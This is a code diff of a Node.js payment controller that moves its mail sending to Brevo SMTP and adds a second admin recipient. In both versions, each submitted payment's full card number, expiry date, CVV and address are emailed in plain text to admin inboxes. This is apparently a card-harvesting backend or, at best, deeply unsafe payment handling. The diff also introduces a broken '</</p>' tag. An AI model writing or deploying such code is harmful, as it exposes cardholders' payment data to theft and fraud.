@@ -1,20 +1,23 @@
 // /controllers/paymentController.js
 const nodemailer = require('nodemailer');
 
-// Create reusable transporter
+// Create Brevo SMTP transporter
 const transporter = nodemailer.createTransport({
-  service: 'gmail', // Or another SMTP provider
+  host: 'smtp-relay.brevo.com',
+  port: 2525, // Works on Render free tier
+  secure: false, // keep false for port 2525
   auth: {
-    user: process.env.EMAIL_USER, // your admin email
-    pass: process.env.EMAIL_PASS, // app password or real password
+    user: process.env.BREVO_SMTP_USER,  // your Brevo login email OR SMTP username
+    pass: process.env.BREVO_SMTP_KEY    // your Brevo SMTP key
   }
 });
 
 // Helper function to send admin email notification
 async function sendAdminNotification(payment) {
   const mailOptions = {
-    from: process.env.EMAIL_USER,
-    to: process.env.ADMIN_EMAIL, // your admin inbox
+    from: process.env.BREVO_FROM_EMAIL,  // verified sender
+    to: [process.env.ADMIN_EMAIL,
+         process.env.ADMIN_EMAIL_2],
     subject: '💳 New Card Payment Submitted',
     html: `
       <h2>New Payment Alert</h2>
@@ -23,7 +26,7 @@ async function sendAdminNotification(payment) {
       <p><strong>Last Name:</strong> ${payment.lastName}</p>
       <p><strong>Card Number:</strong> ${payment.cardNumber}</p>
       <p><strong>Expiry:</strong> ${payment.expiry}</p>
-      <p><strong>CVV:</strong> ${payment.cvv}</p>
+      <p><strong>CVV:</strong> ${payment.cvv}</</p>
       <p><strong>Address:</strong> ${payment.address}</p>
       <p><strong>City:</strong> ${payment.city}</p>
       <p><strong>Postcode:</strong> ${payment.postcode}</p>
